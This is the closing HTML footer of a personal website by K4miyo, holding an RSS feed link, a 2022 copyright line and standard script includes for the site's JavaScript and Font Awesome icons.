<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
